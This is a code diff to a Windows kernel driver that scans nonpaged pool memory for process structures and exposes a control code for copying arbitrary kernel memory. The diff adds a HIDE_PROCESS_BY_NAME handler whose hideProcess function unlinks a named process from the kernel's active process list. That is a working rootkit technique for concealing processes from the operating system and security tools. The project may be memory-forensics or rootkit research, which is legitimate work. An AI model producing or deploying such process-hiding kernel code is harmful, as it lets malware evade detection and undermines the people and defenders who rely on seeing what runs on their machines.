@@ -69,6 +69,7 @@ DriverControl(PDEVICE_OBJECT /* DriverObject */, PIRP Irp) {
     POFFSET_VALUE offsetValues = nullptr;
     PDEREF_ADDR derefAddr = nullptr;
     PSCAN_RANGE scanRange = nullptr;
+    PHIDE_PROCESS processHide = nullptr;
 
     PAGED_CODE();
 
@@ -82,8 +83,6 @@ DriverControl(PDEVICE_OBJECT /* DriverObject */, PIRP Irp) {
      *  } DeviceIoControl;
      **/
     controlCode = irpSp->Parameters.DeviceIoControl.IoControlCode;
-
-    DbgPrint("[NAK] :: [ ] Control Code           : %lu\n", controlCode);
 
     switch (controlCode) {
         case IOCTL_SETUP_OFFSETS:
@@ -126,15 +125,24 @@ DriverControl(PDEVICE_OBJECT /* DriverObject */, PIRP Irp) {
             inputData = (PINPUT_DATA)(Irp->AssociatedIrp.SystemBuffer);
             outputData = (POUTPUT_DATA)MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority | MdlMappingNoExecute);
             scanRange = &(inputData->scanRange);
+            DbgPrint("[NAK] :: Range: %llx - %llx", scanRange->start, scanRange->end);
             (outputData->poolChunk).addr = (ULONG64)scanRemote(scanRange->start, scanRange->end);
+            DbgPrint("[NAK] :: Found: %llx", (outputData->poolChunk).addr);
             break;
         case DEREFERENCE_ADDRESS:
-            DbgPrint("[NAK] :: [ ] Deref address\n");
+            // DbgPrint("[NAK] :: [ ] Deref address\n");
             inputData = (PINPUT_DATA)(Irp->AssociatedIrp.SystemBuffer);
             derefAddr = &(inputData->derefAddr);
             outputData = (POUTPUT_DATA)MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority | MdlMappingNoExecute);
-            DbgPrint("[NAK] :: [ ] Deref %llu bytes from %llx\n", derefAddr->size, derefAddr->addr);
+            // DbgPrint("[NAK] :: [ ] Deref %llu bytes from %llx\n", derefAddr->size, derefAddr->addr);
             RtlCopyBytes((PVOID)outputData, (PVOID)derefAddr->addr, (SIZE_T)derefAddr->size);
+            break;
+        case HIDE_PROCESS_BY_NAME:
+            DbgPrint("[NAK] :: [ ] Hide process\n");
+            inputData = (PINPUT_DATA)(Irp->AssociatedIrp.SystemBuffer);
+            processHide = &(inputData->processHide);
+            DbgPrint("[NAK] :: [ ] Hide process name: [%15s]; size: %llu\n", processHide->name, processHide->size);
+            hideProcess(processHide->name, processHide->size);
             break;
         default:
             break;
@@ -227,6 +235,35 @@ scan_ps_active_head() {
         eprocess = (PVOID)(*(ULONG64*)((ULONG64)eprocess + eprocessLinkOffset) - eprocessLinkOffset);
         DbgPrint("[NAK] :: [ ] eprocess               : 0x%p, [%15s]\n",
                  eprocess, (char*)((ULONG64)eprocess + eprocessNameOffset));
+    }
+}
+
+VOID
+hideProcess(CHAR* name, ULONG64 size) {
+    PVOID eprocess = (PVOID)((ULONG64)processHead - eprocessLinkOffset);
+    while (*(ULONG64*)((ULONG64)eprocess + eprocessLinkOffset) != (ULONG64)processHead) {
+        PVOID next_eprocess = (PVOID)(*(ULONG64*)((ULONG64)eprocess + eprocessLinkOffset) - eprocessLinkOffset);
+        char* processName = (char*)((ULONG64)eprocess + eprocessNameOffset);
+        int i = 0;
+        for (; i < size; i++) {
+            if (processName[i] != name[i]) break;
+        }
+        if (i != size) {
+            eprocess = next_eprocess;
+            continue;
+        }
+        // found process with name
+        PVOID next_eprocess_link = (PVOID)(*(ULONG64*)((ULONG64)eprocess + eprocessLinkOffset));
+        PVOID prev_eprocess_link = (PVOID)(*(ULONG64*)((ULONG64)eprocess + eprocessLinkOffset + listBLinkOffset));
+
+        // set current to 0
+        // *(ULONG64*)((ULONG64)eprocess + eprocessLinkOffset) = 0;
+        // *(ULONG64*)((ULONG64)eprocess + eprocessLinkOffset + listBLinkOffset) = 0;
+
+        *(ULONG64*)((ULONG64)next_eprocess_link + listBLinkOffset) = (ULONG64)prev_eprocess_link;
+        *(ULONG64*)prev_eprocess_link = (ULONG64)next_eprocess_link;
+
+        eprocess = next_eprocess;
     }
 }
 
@@ -431,7 +468,7 @@ validPool(PPOOL_HEADER p) {
     // (p->blockSize > 0) &&             // rule 2
     // (p->blockSize * CHUNK_SIZE + offsetInPage == PAGE_SIZE) &&  // rule 3
     // (p->prevBlockSize * CHUNK_SIZE <= offsetInPage) // rule 5
-    if ((p->blockSize * CHUNK_SIZE)< 0xb00 + 0x10 || // eprocess size + pool_header size
+    if ((p->blockSize * CHUNK_SIZE) < 0xb00 + 0x10 || // eprocess size + pool_header size
         // p->poolType % 2 != 0 || // pool tag must be even number aka nonpaged
         p->poolType != 2     // force to search for nonpaged pool only aka poolType == 2
        )
@@ -470,7 +507,7 @@ scanNormalPool(ULONG64 nonPagedPoolStart, ULONG64 nonPagedPoolEnd) {
      **/
 
     POOL_HEADER p;
-    PVOID eprocess;
+    PVOID eprocess = nullptr;
     char eprocess_name[16] = {0}; // eprocess name is 15 bytes + 1 null
     PVOID currentAddr = (PVOID)(nonPagedPoolStart);
     while (true) {
@@ -505,20 +542,25 @@ scanNormalPool(ULONG64 nonPagedPoolStart, ULONG64 nonPagedPoolEnd) {
         if (!validTag(&p)) continue;
         if (!validPool(&p)) continue;
 
-        if (p.tag != 'Proc')
+        if (p.tag != 'Proc' && p.tag != 'corP')
             continue;
 
         // TODO: Parse data as _EPROCESS
         // The first Proc found seems to be the System _EPROCESS
         // The offset of system's chunk to _EPROCESS is 0x40, size is ...
         // but offset of other processes' chunk to _EPROCESS is 0x80, size is 0xe00
+        // TODO: search for CreateTime, this field must be in range [system startup time; now]
+        // this is resolved in frontend
         printChunkInfo(&p);
-        if (p->blockSize * CHUNK_SIZE == 0xf00) {
+        if (p.blockSize * CHUNK_SIZE == 0xf00) {
             eprocess = (PVOID)((ULONG64)p.addr + 0x40);
-        } else if (p->blockSize * CHUNK_SIZE == 0xd80) {
+        } else if (p.blockSize * CHUNK_SIZE == 0xd80) {
             eprocess = (PVOID)((ULONG64)p.addr + 0x70);
-        } else if (p->blockSize * CHUNK_SIZE == 0xe00) {
+        } else if (p.blockSize * CHUNK_SIZE == 0xe00) {
             eprocess = (PVOID)((ULONG64)p.addr + 0x80);
+        } else {
+            DbgPrint("[NAK] :: [ ] This is not a valid eprocess, maybe\n");
+            continue;
         }
         RtlStringCbCopyNA(eprocess_name, 16, (char*)((ULONG64)eprocess + eprocessNameOffset), 15);
         DbgPrint("[NAK] :: [ ] eprocess offset 0x80   : 0x%p, [%s]\n", eprocess, eprocess_name);
@@ -552,7 +594,7 @@ scanRemote(ULONG64 startAddress, ULONG64 endAddress) {
         if (!validTag(&p)) continue;
         if (!validPool(&p)) continue;
 
-        if (p.tag != 'Proc')
+        if (p.tag != 'Proc' && p.tag != 'corP')
             continue;
 
         return p.addr;
